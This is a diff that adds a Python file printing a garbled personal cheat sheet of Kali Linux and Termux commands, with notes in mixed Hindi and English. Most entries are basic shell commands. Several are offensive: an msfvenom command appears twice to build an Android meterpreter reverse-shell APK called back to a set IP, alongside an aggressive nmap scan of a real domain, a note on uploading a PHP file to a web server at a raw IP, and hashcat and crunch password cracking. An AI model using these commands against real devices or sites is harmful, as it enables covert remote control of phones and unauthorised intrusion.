@@ -1,0 +1,64 @@
+#this is single line comment and print single line or , is space line.
+print('hello 95','hello' , end=' end ');
+
+'''dople line comment and print dople or treple line'''
+print(''' \n  \n
+                Kali Linux Commands
+                
+   important = android/meterpreter/reverse_tcp.
+   
+ nmap me deep port scan krne ki l nmap -p22,80 -A -T5 -vv exiftool.org -oA nmaps
+   
+  website me php file upload l python3 fattackw.txt  http://148.66.136.188
+    
+    1 cd /sdcard/ = enter sdcard;
+    2  touch text = create file and touch command or file name.
+    3  exit = programe exit.
+    4  ls = file and folder list.
+    5  cd .. = open second folder 
+    6  cat file name = open to file words.
+    7  history = recently command list.
+    8  figlet Shubham Omer = figlet command used to creat hologram text pecture for use symbols.
+    9  ifconfig > filename.txt = > command use to ifconfig comand result show to filename.txt.
+   10  nethunter -r =open nethunter.
+   13  chmod 764 YTMusic = chang file permission.
+   14  cd ..
+   15  ls -l Ytmusic = open file permission.
+    16  cd /Download/ = access Download and change name to access other folder.
+   
+   17  cp file name /copy destionation/ = copy to sdcard and other place.
+   
+   18  creat hand.apk = msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.239 LPORT+4444 R > hand.apk
+   
+   19 copy file and move = cp file name /sdcard/
+   
+   20 password rame md5 hashbreak = hashcat -m 0 db4180193c578a686685739556791951 /sdcard/wordlest/Alldegets.txt --force
+   
+   21 create wordlist = crunch 2 5 abc -o password.txt
+   
+   22 website information = whatweb website.name
+   23 ping website = ping www.yahoo.com
+   nano install-nethunter-termux = open nano space.
+   
+   24 open scapy command list = lsc()
+   open Mac2unix and your write doble = termux command "mac2unix"
+   
+   25 ICMP full form = internet control message protocol.
+   
+   apt install proot-distro
+   
+   proot-distro list
+   
+   proot-distro login ubuntu
+   
+   nethunter download = ./install-nethunter-termux
+   
+   msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.239 LPORT+4444 R > hand.apk
+   
+   netstat
+   
+   
+  ''');
+  
+  
+  
